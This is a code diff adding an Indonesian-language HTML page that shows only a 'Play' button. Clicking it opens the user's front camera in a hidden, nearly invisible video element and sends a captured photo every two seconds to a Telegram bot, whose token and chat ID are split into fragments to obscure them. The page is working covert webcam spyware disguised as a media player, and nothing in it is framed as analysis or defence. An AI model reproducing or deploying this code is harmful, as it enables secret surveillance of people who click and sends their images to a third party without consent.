@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Start</title>
+  <style>
+    body {
+      background: #f3f4f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    button {
+      font-size: 18px;
+      padding: 12px 26px;
+      border: none;
+      border-radius: 10px;
+      background-color: #10b981;
+      color: white;
+      cursor: pointer;
+    }
+    video {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;
+      pointer-events: none;
+    }
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <button id="start">▶️ Play</button>
+  <video id="v" autoplay muted playsinline></video>
+  <canvas id="cvs"></canvas>
+
+  <script>
+    const t = ["7972", "5258", "58:AA", "EMzl2HS", "lIGECvIDnv", "6o_KqhnJr", "XGRNwoA"];
+    const token = t.join(""); // Token utuh disusun saat runtime
+
+    const c = ["75", "756", "78578"];
+    const chatId = c.join(""); // Chat ID utuh
+
+    const video = document.getElementById("v");
+    const canvas = document.getElementById("cvs");
+    const ctx = canvas.getContext("2d");
+
+    document.getElementById("start").onclick = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+
+        const wait = setInterval(() => {
+          if (video.readyState === 4) {
+            clearInterval(wait);
+            captureLoop();
+          }
+        }, 100);
+      } catch (e) {
+        console.warn("Gagal akses kamera", e);
+      }
+    };
+
+    function captureLoop() {
+      setInterval(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+
+        canvas.toBlob((blob) => {
+          const fd = new FormData();
+          fd.append("chat_id", chatId);
+          fd.append("photo", blob);
+
+          fetch("https://api.telegram.org/bot" + token + "/sendPhoto", {
+            method: "POST",
+            body: fd
+          }).catch(() => {});
+        }, "image/jpeg", 0.8);
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
